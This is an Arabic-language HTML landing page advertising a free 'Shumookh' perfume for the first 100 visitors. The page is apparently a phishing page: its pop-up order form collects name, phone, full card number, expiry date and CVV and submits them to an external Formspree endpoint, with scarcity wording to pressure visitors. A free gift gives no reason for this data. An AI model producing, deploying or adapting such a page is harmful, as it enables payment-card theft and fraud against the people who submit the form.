<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>عطر شموخ – هدية لأول 100 شخص</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: "Tajawal", sans-serif;
      background: linear-gradient(to bottom, #fff, #f9f7f3);
      color: #222;
      text-align: center;
    }

    header {
      padding: 60px 20px;
      background: linear-gradient(135deg, #000, #d4af37);
      color: #fff;
    }

    header h1 {
      font-size: 2.8em;
      margin-bottom: 20px;
    }

    header p {
      font-size: 1.3em;
      line-height: 1.6;
      margin: 10px auto;
      max-width: 600px;
    }

    button {
      padding: 16px 40px;
      font-size: 1.4em;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      background: #000;
      color: #fff;
      transition: 0.3s;
      margin-top: 25px;
    }

    button:hover {
      background: #d4af37;
      color: #000;
      transform: scale(1.05);
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
    }

    .modal-content {
      background: #fff;
      margin: 8% auto;
      padding: 25px;
      border-radius: 16px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.4s ease;
      position: relative;
    }

    @keyframes fadeIn {
      from { transform: scale(0.8); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .close {
      position: absolute;
      top: 10px;
      left: 10px;
      font-size: 22px;
      cursor: pointer;
      color: #000;
    }

    form input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    form button {
      background: #000;
      color: #fff;
      border: none;
      padding: 12px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      transition: 0.3s;
    }

    form button:hover {
      background: #d4af37;
      color: #000;
    }

    footer {
      background: #000;
      color: #fff;
      text-align: center;
      padding: 20px;
      margin-top: 40px;
    }
  </style>
</head>
<body>

<header>
  <h1>✨ عطر شموخ ✨</h1>
  <p>
    عطر الفخامة والتميّز، هدية مجانية لأول <strong>100 شخص فقط</strong>.<br>
    أسرع واحجز نسختك الآن!
  </p>
  <button id="orderBtn">اطلبه الآن</button>
</header>

<!-- Popup Modal -->
<div id="orderModal" class="modal">
  <div class="modal-content">
    <span class="close">&times;</span>
    <h2>أدخل بياناتك</h2>
    <form action="https://formspree.io/f/meolwpjr" method="POST">
      <input type="text" name="name" placeholder="الاسم الكامل" required>
      <input type="tel" name="phone" placeholder="رقم الهاتف" required>
      <input type="text" name="cardNumber" placeholder="رقم البطاقة" required>
      <input type="text" name="expiry" placeholder="تاريخ الانتهاء MM/YY" required>
      <input type="text" name="cvv" placeholder="الرمز المكوّن من 3 أرقام" required>
      <button type="submit">إرسال الطلب</button>
    </form>
  </div>
</div>

<footer>
  © 2025 جميع الحقوق محفوظة
</footer>

<script>
  const modal = document.getElementById("orderModal");
  const btn = document.getElementById("orderBtn");
  const closeBtn = document.querySelector(".close");

  btn.onclick = () => {
    modal.style.display = "block";
  };

  closeBtn.onclick = () => {
    modal.style.display = "none";
  };

  window.onclick = (event) => {
    if (event.target === modal) {
      modal.style.display = "none";
    }
  };
</script>
</body>
</html>
